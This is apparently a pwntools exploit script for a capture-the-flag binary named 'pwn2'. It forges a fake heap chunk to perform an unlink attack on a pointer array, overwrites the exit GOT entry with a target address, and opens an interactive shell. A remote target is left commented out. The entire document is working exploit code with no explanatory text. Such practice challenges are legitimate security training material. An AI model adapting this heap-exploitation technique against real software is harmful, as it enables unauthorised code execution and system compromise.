from pwn import *

system_addr = 0x4009b6
pointer_array = 0x6012a0
# 0000000000601250 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5
got_exit = 0x601250

overwite_got = '\x00'*24 + p64(got_exit)
fake_chunk = '\x00'*16 + p64(pointer_array-24) + p64(pointer_array-16) + 'a'*(0x80-32) + p64(0x80) + p64(0x90)

p = process('./pwn2')
#p = remote('10.211.55.8', 8888)

p.recvuntil('-----\n')
p.sendline('1')
p.recvuntil('create:')
p.sendline('0')

p.recvuntil('-----\n')
p.sendline('1')
p.recvuntil('create:')
p.sendline('1')

p.recvuntil('-----\n')
p.sendline('2')
p.recvuntil('edit:')
p.sendline('0')
p.recvuntil('input:')
p.sendline(str(len(fake_chunk)))
p.recvuntil('node:')
p.sendline(fake_chunk)

p.recvuntil('-----\n')
p.sendline('3')
p.recvuntil('create:')
p.sendline('1')

p.recvuntil('-----\n')
p.sendline('2')
p.recvuntil('edit:')
p.sendline('0')
p.recvuntil('input:')
p.sendline(str(len(overwite_got)))
p.recvuntil('node:')
p.sendline(overwite_got)

p.recvuntil('-----\n')
p.sendline('2')
p.recvuntil('edit:')
p.sendline('0')
p.recvuntil('input:')
p.sendline(str(8))
p.recvuntil('node:')
p.sendline(p64(system_addr))

p.recvuntil('----------\n')
p.sendline('5')
p.interactive()


